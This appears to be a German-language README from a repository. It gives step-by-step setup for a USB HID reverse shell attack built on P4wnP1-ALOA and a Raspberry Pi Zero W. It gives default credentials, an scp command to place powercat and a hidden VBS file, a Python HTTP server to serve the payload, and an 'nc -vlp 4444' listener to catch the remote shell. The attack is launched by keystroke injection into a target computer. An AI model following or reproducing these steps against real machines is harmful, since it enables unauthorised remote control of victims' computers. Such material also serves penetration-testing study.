#Vorarbeit 
Alles was sich hier abspielt baut auf dem P4wnP1-ALOA auf: 
https://github.com/RoganDawes/P4wnP1_aloa
Hier wird basierend auf dieser eine Reverse Shell zum Raspberry Pi Zero W aufgebaut.

#Einleitung
Zuerst sollten entweder die im kali-linux vorhandenen Teile mit:
cat kali-linux-parta* > kali-linux.img.xz
zusammengefügt werden oder das vollständige Image von:
https://github.com/RoganDawes/P4wnP1_aloa/tags
herunter geladen werden.

Dieses kann dann z.B. mittels des Pi Imagers auf eine Micro SD-Karte aufgespielt werden.

#Website-Einstellungen
Nach dem booten des Pis erscheint der Access Point des P4wnP1 hier kann sich mit dem standard passwort:
MaMe82-P4wnP1
einloggen. Auf der Website: 172.24.0.1:8000 finden sich viele Einstellungsmöglichkeiten. Diese sind so her zu richten, wie es auf den Bilder im Ordner dieses Gits angegeben ist.
Wichtig dabei ist diese immer zu speicher und auch in Generic Settings sicher zustellen, dass diese geöffnet werden.

Der Code für das HID-Skript findet sich auch nochmal als ReverseShell.js im selben Ordner.

#Reverse Shell Code
Um den restlichen Code zu plazieren muss zuerst eine Verbindung mit dem Pi hergestellt werden:
ssh root@172.24.0.1
mit dem Passwort toor
Hier legen wir dann eine Ordner names powercat an.
Diesen müssen wir nur noch mit den Dateien aus diesem git füllen. Das geht z.B. mit:
scp powercat/Hidden.vbs root@172.24.0.1:/root/powercat/Hidden.vbs

#Vorbereitungen:
Um bei dem Angriff auf die Files des Raspberry Pi Zero W zugreifen zu können müssen wir diese mittels eines File-Servers zugänglich machen. Ein einfacher Befehl dazu ist:
python -m SimpleHTTPServer 80
Um die ReverseShell aufzufangen brauchen wir noch einen Listener:
nc -vlp 4444

Für beides bieten sich screens an. Diese Vorbereitungen müssen vor dem ausführen des HID-Skripts passieren. Es wäre also gut, wenn diese zukünftig automatisch beim booten starten.

